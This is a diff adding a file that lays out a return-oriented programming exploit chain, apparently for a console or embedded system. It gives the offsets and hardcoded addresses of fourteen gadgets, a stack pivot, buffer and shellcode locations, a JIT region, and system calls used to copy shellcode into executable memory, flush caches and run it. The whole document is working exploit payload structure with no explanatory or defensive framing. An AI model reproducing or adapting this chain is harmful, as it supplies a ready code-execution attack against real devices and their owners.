@@ -1,0 +1,67 @@
+0x0C  - ROP gadget #1 (at the start, r1 is at offset 0x08)      0x0ea125b0
+0x10  - Buffer address                                          0x1DD7B814
+0x14  - 0                                                       0x0
+
+0x1C  - ROP gadget #2 (at the start, r1 is at offset 0x18)      0x0EA12168
+
+0x24  - ROP gadget #3 (at the start, r1 is at offset 0x20)      0x0e0f71d8
+0x28  - 0
+0x2C  - Shellcode address                                       0x1DD7B974
+
+0x40  - 0                                                       0x0
+0x44  - Shellcode address                                       0x1DD7B974
+
+0x4C  - ROP gadget #4 (at the start, r1 is at offset 0x48)      0x0e23b450
+0x58  - Shellcode length                                        0x8000
+0xA8  - Buffer address + 4                                      0x1DD7B818
+0xAC  - JIT address                                             0x01800000
+
+0xB4  - ROP gadget #5 (at the start, r1 is at offset 0xB0)      0x0EA12168
+
+0xBC  - ROP gadget #6 (at the start, r1 is at offset 0xB8)      0x0ea125b0
+0xC0  - Buffer address + 8                                      0x1DD7B81C
+0xC4  - JIT address                                             0x01800000
+
+0xCC  - ROP gadget #7 (at the start, r1 is at offset 0xC8)      0x0e0f71d8
+0xD0  - 0
+0xD4  - Shellcode length                                        0x8000
+
+0xE8  - 0                                                       0x0
+0xEC  - Shellcode length                                        0x8000
+
+0xF4  - ROP gadget #8 (at the start, r1 is at offset 0xF0)      0x0EA12168
+
+0xFC  - ROP gadget #9 (at the start, r1 is at offset 0xF8)      0x0ea125b0
+0x100 - Buffer address + 12                                     0x1DD7B820
+0x104 - JIT address                                             0x01800000
+
+0x10C - ROP gadget #10 (at the start, r1 is at offset 0x108)    0x0e0f71d8
+0x110 - 0
+0x114 - Shellcode length                                        0x8000
+
+0x128 - 0                                                       0x0
+0x12C - Shellcode length                                        0x8000
+
+0x134 - ROP gadget #11 (at the start, r1 is at offset 0x130)    0x0EA12168
+
+0x13C - ROP gadget #12 (at the start, r1 is at offset 0x138)    0x0ea125b0
+0x140 - Buffer address                                          0x1DD7B814
+0x144 - 1                                                       0x1
+
+0x14C - ROP gadget #13 (at the start, r1 is at offset 0x148)    0x0EA12168
+
+0x154 - ROP gadget #14                                          0x01800000
+
+0x160 - Shellcode
+
+0x4FC - Function epilogue gadget                                0x0EA125FC
+0x500 - Function epilogue gadget                                0x0EA125FC
+0x504 - Function epilogue gadget                                0x0EA125FC
+0x508 - Function epilogue gadget                                0x0EA125FC
+0x50C - Function epilogue gadget                                0x0EA125FC
+0x53C - OSSwitchSecCodeGenMode()                                0x01031c48
+0x540 - memcpy()                                                0x01030e9c
+0x544 - DCFlushRange()                                          0x01020eac
+0x548 - ICInvalidateRange()                                     0x01020fd4
+0x54C - Stack pivot gadget                  	                0x0e3c6984
+0x5EC - Function epilogue gadget                                0x0EA125FC
